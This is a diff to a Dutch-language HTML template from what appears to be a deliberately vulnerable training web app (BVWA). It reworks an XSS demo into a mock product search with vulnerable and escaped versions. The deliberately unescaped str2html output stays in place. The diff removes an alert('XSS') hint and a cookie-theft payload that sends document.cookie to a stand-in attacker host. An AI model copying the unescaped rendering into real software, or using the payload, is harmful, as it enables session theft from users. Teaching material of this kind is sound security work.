@@ -5,6 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{{.Title}} - BVWA</title>
     <link rel="stylesheet" href="/static/css/bvwa.css">
+    <style>
+        .search-output {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 14px 16px;
+            margin-top: 10px;
+            min-height: 48px;
+            font-size: 14px;
+        }
+        .search-output.vuln {
+            border-color: #e74c3c;
+            background: #fdecea;
+        }
+        .search-output.safe {
+            border-color: #27ae60;
+            background: #eafaf1;
+        }
+        .product-list {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #555;
+        }
+        .product-list li {
+            padding: 4px 0;
+        }
+    </style>
 </head>
 <body>
 
@@ -30,7 +57,7 @@
 
     <div class="module-header">
         <span class="badge">A05</span>
-        <h1>Injection — XSS</h1>
+        <h1>BvwAshop Productzoeker</h1>
         <button type="button" class="btn-info" id="openInfoBtn">
             Info &amp; CWEs
         </button>
@@ -61,31 +88,26 @@
             <div class="card-header vuln">Kwetsbare versie</div>
             <div class="card-body">
                 <p>
-                    Input wordt <strong>als raw HTML</strong>
-                    in de pagina gezet. Een aanvaller kan
-                    JavaScript injecteren dat in de browser
-                    van het slachtoffer wordt uitgevoerd.
+                    De zoekterm wordt <strong>als raw HTML</strong>
+                    in de pagina weergegeven. Een aanvaller kan
+                    markup of scripts injecteren die in de browser
+                    van het slachtoffer worden uitgevoerd.
                 </p>
 
                 <div class="code-block">
 <span class="ccmt">// KWETSBAAR: raw HTML output</span>
-<span class="ccmt">// In template: {{"{{"}}str2html .RawInput{{"}}"}}</span>
+<span class="ccmt">// Template: {{"{{"}}str2html .RawInput{{"}}"}}</span>
 <span class="ccmt">// Input wordt NIET geescaped!</span>
                 </div>
 
-                <p style="font-size:13px; color:#e74c3c; font-weight:bold;">
-                    Probeer: &lt;script&gt;alert('XSS')&lt;/script&gt;
-                </p>
-
                 <form method="GET" action="/injection/xss/vulnerable">
                     <div class="input-group">
-                        <label>Input (wordt als HTML gerenderd):</label>
-                        <input type="text" name="input"
-                               placeholder="&lt;script&gt;alert('XSS')&lt;/script&gt;">
+                        <label>Zoek een product:</label>
+                        <input type="text" name="q"
+                               placeholder="Zoekterm...">
                     </div>
-                    <button type="submit"
-                            class="btn-submit red">
-                        Versturen (kwetsbaar)
+                    <button type="submit" class="btn-submit red">
+                        Zoeken (kwetsbaar)
                     </button>
                 </form>
             </div>
@@ -96,31 +118,25 @@
             <div class="card-header safe">Veilige versie</div>
             <div class="card-body">
                 <p>
-                    Input wordt <strong>automatisch geescaped</strong>
-                    door Beego's template engine.
-                    <code>&lt;script&gt;</code> wordt omgezet naar
-                    <code>&amp;lt;script&amp;gt;</code>.
+                    De zoekterm wordt <strong>automatisch geescaped</strong>
+                    door Beego&rsquo;s template engine.
+                    Speciale tekens worden omgezet naar HTML-entities.
                 </p>
 
                 <div class="code-block">
 <span class="ccmt">// VEILIG: Beego escapet automatisch</span>
-<span class="ccmt">// In template: {{"{{"}} .SafeInput {{"}}"}}</span>
-<span class="ccmt">// Beego converteert &lt; naar &amp;lt;</span>
+<span class="ccmt">// Template: {{"{{"}} .SafeInput {{"}}"}}</span>
+<span class="ccmt">// &lt; wordt &amp;lt;, &gt; wordt &amp;gt;</span>
                 </div>
-
-                <p style="font-size:13px; color:#27ae60; font-weight:bold;">
-                    Script-tags worden als tekst weergegeven.
-                </p>
 
                 <form method="GET" action="/injection/xss/secure">
                     <div class="input-group">
-                        <label>Input (wordt geescaped):</label>
-                        <input type="text" name="input"
-                               placeholder="&lt;script&gt;alert('XSS')&lt;/script&gt;">
+                        <label>Zoek een product:</label>
+                        <input type="text" name="q"
+                               placeholder="Zoekterm...">
                     </div>
-                    <button type="submit"
-                            class="btn-submit green">
-                        Versturen (veilig)
+                    <button type="submit" class="btn-submit green">
+                        Zoeken (veilig)
                     </button>
                 </form>
             </div>
@@ -130,46 +146,68 @@
 
     <!-- Output box -->
     <div class="output-box">
-        <h3>Output voor: <strong>{{.Title}}</strong></h3>
+        <h3>
+            {{if eq .Title "XSS Injection (Kwetsbaar)"}}
+            <span class="tag-vuln">KWETSBAAR</span>
+            {{else}}
+            <span class="tag-safe">VEILIG</span>
+            {{end}}
+            Zoekresultaten &mdash; BvwAshop
+        </h3>
 
         {{if eq .Title "XSS Injection (Kwetsbaar)"}}
-        <span class="tag-vuln">KWETSBAAR</span>
-        <p>Input wordt als <strong>raw HTML</strong> gerenderd:</p>
-        <div class="xss-output-vuln">
-            {{if .RawInput}}
+
+        {{if .RawInput}}
+        <p style="font-size:14px; margin-bottom:6px;">
+            Zoekresultaten voor:
+        </p>
+        <div class="search-output vuln">
             {{str2html .RawInput}}
-            {{else}}
-            <em style="color:#aaa;">
-                Voer input in om XSS te demonstreren.
-            </em>
-            {{end}}
         </div>
-        <p style="color:#e74c3c; font-size:13px;">
-            Script-tags worden uitgevoerd! Inspecteer de
-            page source om het verschil te zien.
+        <p style="color:#e74c3c; font-size:12px; margin-top:6px;">
+            De zoekterm wordt als HTML gerenderd &mdash; inspecteer de paginabron (Ctrl+U).
         </p>
         {{else}}
-        <span class="tag-safe">VEILIG</span>
-        <p>Input wordt als <strong>veilige tekst</strong> getoond:</p>
-        <div class="xss-output-safe">
-            {{if .SafeInput}}
-            {{.SafeInput}}
-            {{else}}
-            <em style="color:#aaa;">
-                Voer input in om de escaping te zien.
-            </em>
-            {{end}}
-        </div>
-        <p style="color:#27ae60; font-size:13px;">
-            Script-tags zijn geescaped en worden als tekst
-            getoond, niet uitgevoerd.
+        <p style="color:#888; font-style:italic;">
+            Voer een zoekterm in om de productzoeker te gebruiken.
         </p>
+        <ul class="product-list">
+            <li>Laptop Pro 15"</li>
+            <li>Draadloze muis</li>
+            <li>USB-C Hub</li>
+            <li>Mechanisch toetsenbord</li>
+        </ul>
+        {{end}}
+
+        {{else}}
+
+        {{if .SafeInput}}
+        <p style="font-size:14px; margin-bottom:6px;">
+            Zoekresultaten voor:
+        </p>
+        <div class="search-output safe">
+            {{.SafeInput}}
+        </div>
+        <p style="color:#27ae60; font-size:12px; margin-top:6px;">
+            Speciale tekens zijn geescaped en worden als tekst weergegeven.
+        </p>
+        {{else}}
+        <p style="color:#888; font-style:italic;">
+            Voer een zoekterm in om de productzoeker te gebruiken.
+        </p>
+        <ul class="product-list">
+            <li>Laptop Pro 15"</li>
+            <li>Draadloze muis</li>
+            <li>USB-C Hub</li>
+            <li>Mechanisch toetsenbord</li>
+        </ul>
+        {{end}}
+
         {{end}}
 
         <div class="tip">
             Tip: Bekijk de paginabron (Ctrl+U) om het verschil
-            te zien tussen de kwetsbare (raw HTML) en veilige
-            (geescapede tekst) versie.
+            te zien tussen de kwetsbare en veilige versie.
         </div>
     </div>
 
@@ -275,13 +313,7 @@
             <div class="cwe-list">
                 <span class="cwe-tag">CWE-79 Cross-site Scripting (XSS)</span>
                 <span class="cwe-tag">CWE-80 Basic XSS</span>
-                <span class="cwe-tag">CWE-81 Improper Neutralization of Script in Error</span>
-                <span class="cwe-tag">CWE-82 XSS via IMG Tags</span>
                 <span class="cwe-tag">CWE-83 XSS in Attributes</span>
-                <span class="cwe-tag">CWE-84 XSS via Unicode Encoding</span>
-                <span class="cwe-tag">CWE-85 Doubled Character XSS</span>
-                <span class="cwe-tag">CWE-86 XSS in Alternate Encoding</span>
-                <span class="cwe-tag">CWE-87 XSS in Script Syntax</span>
                 <span class="cwe-tag">CWE-20 Improper Input Validation</span>
                 <span class="cwe-tag">CWE-116 Improper Encoding/Escaping of Output</span>
                 <span class="cwe-tag">CWE-184 Incomplete List of Disallowed Inputs</span>
@@ -298,16 +330,15 @@
                 (CWE-79):
                 <ul>
                     <li><strong>Script executie:</strong>
-                        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
-                        wordt uitgevoerd in de browser</li>
+                        script-tags worden door de browser uitgevoerd</li>
                     <li><strong>Cookie diefstal:</strong>
-                        <code>&lt;script&gt;document.location='http://aanvaller.nl/steal?c='+document.cookie&lt;/script&gt;</code></li>
-                    <li><strong>Keylogging:</strong> aanvaller
-                        kan alle toetsaanslagen opnemen</li>
-                    <li><strong>Phishing:</strong> de pagina
-                        kan volledig worden overschreven</li>
-                    <li><strong>Malware:</strong> drive-by
-                        downloads via script injection</li>
+                        aanvaller kan sessiecookies uitlezen via <code>document.cookie</code></li>
+                    <li><strong>Keylogging:</strong>
+                        alle toetsaanslagen kunnen worden onderschept</li>
+                    <li><strong>Phishing:</strong>
+                        de pagina kan volledig worden overschreven</li>
+                    <li><strong>Malware:</strong>
+                        drive-by downloads via script injection</li>
                 </ul>
             </div>
         </div>
@@ -321,10 +352,8 @@
                 van Beego:
                 <ul>
                     <li><strong>HTML entities:</strong>
-                        <code>&lt;</code> wordt
-                        <code>&amp;lt;</code>,
-                        <code>&gt;</code> wordt
-                        <code>&amp;gt;</code></li>
+                        <code>&lt;</code> wordt <code>&amp;lt;</code>,
+                        <code>&gt;</code> wordt <code>&amp;gt;</code></li>
                     <li><strong>Scripts geblokkeerd:</strong>
                         script-tags worden als tekst
                         weergegeven, niet uitgevoerd</li>
@@ -334,9 +363,6 @@
                     <li><strong>str2html bewust vermijden:</strong>
                         gebruik alleen als de bron 100%
                         vertrouwd is</li>
-                    <li><strong>CSP als extra laag:</strong>
-                        Content-Security-Policy header
-                        blokkeert inline scripts</li>
                 </ul>
             </div>
         </div>
@@ -361,8 +387,6 @@
     BVWA is uitsluitend bedoeld voor educatieve doeleinden -
     gebruik alleen in een geisoleerde testomgeving.
 </footer>
-
-
 
 <script type="text/javascript" src="/static/js/modal.js"></script>
 
